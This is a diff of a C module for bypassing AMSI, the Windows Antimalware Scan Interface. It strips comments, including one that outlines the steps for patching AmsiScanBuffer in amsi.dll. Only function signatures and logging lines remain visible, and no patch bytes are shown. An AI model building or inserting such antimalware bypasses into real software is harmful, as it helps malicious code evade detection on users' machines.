@@ -2,7 +2,6 @@
  * 
  * AMSI BYPASS MODULE
  * 
- *
  * Author: 28Zaakypro@proton.me
  * 
  * The Antimalware Scan Interface (AMSI) scans scripts and in-memory content
@@ -24,19 +23,6 @@
 
 #include "amsi_bypass.h"
 #include "obfuscation.h"
-
-/*
- * PatchAmsiScanBuffer
- * -------------------
- * Patches the AmsiScanBuffer function in amsi.dll.
- *
- * PROCESS:
- * 1. Load amsi.dll
- * 2. Get the address of AmsiScanBuffer
- * 3. Change memory protections
- * 4. Write the patch
- * 5. Restore protections
- */
 
 BOOL PatchAmsiScanBuffer() {
     printf("[*] Patching AmsiScanBuffer...\n");
@@ -107,9 +93,6 @@ BOOL PatchAmsiScanBuffer() {
     return TRUE;
 }
 
-/*
- * Disables AMSI by patching AmsiScanBuffer.
- */
 BOOL DisableAMSI(AMSI_RESULT* result) {
     printf("\n");
     printf("AMSI BYPASS\n");
@@ -117,7 +100,6 @@ BOOL DisableAMSI(AMSI_RESULT* result) {
     result->success = FALSE;
     result->amsiScanBufferPatched = FALSE;
 
-    // Patch AmsiScanBuffer
     result->amsiScanBufferPatched = PatchAmsiScanBuffer();
     result->success = result->amsiScanBufferPatched;
     
